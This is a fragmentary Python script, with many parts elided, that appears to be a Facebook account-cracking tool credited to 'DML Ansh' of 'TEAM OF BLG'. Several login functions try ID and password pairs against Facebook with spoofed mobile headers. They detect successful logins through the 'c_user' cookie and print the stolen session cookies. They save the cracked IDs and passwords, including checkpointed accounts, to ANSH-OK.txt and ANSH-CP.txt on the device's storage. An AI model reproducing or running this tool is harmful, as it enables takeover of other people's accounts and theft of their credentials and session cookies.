...
#github= ANSH790501
# fb page https://www.facebook.com/profile.php?id=61550072034581
...
os.system("xdg-open https://github.com/-hunterjonty321")
#app  check 
...
logo = """\033[1;31m
               ...
               ╲ ╲▏╭╮▕╱ ╱     \033[1;31m╔╦╗┌┬┐┬  
                ...
                \033[1;34m  ▏▏▕▕
                  ▏▏▕▕
                \033[1;31m ╭╰ ╮╭╰ ╮
            \033[1;39msᴜʙ \033[1;35mᴋᴀ \033[1;36mʙᴀᴀᴘ \033[1;33mansh
\033[1;34m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;34m๑۩♡۩๑\033[1;34m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;39m━▷ \033[1;36m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m DML Ansh
\033[1;39m━▷ \033[1;36m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF BLG
\033[1;39m━▷ \033[1;36m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.0
\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 𝘽𝙇𝙂 𝘽𝙍𝘼𝙉𝘿 (𝗝𝗲𝘀𝘀𝗶 𝗥𝗶𝗻𝗸𝘂) 
\033[1;34m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;34m๑۩♡۩๑\033[1;34m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
...
def xerx1():
	...
	print('[?] Ids saved in ANSH-OK.txt,ANSH-CP.txt')
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[ANSH-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in xerx_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/ANSH-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[ANSH-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/ANSH-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/ANSH-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-ANSH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-ANSH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				if 'y' in xerx_xd:
					...
					break
				open('/sdcard/ANDH-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-ANSH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-ANSH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-ANSH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-ANSH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
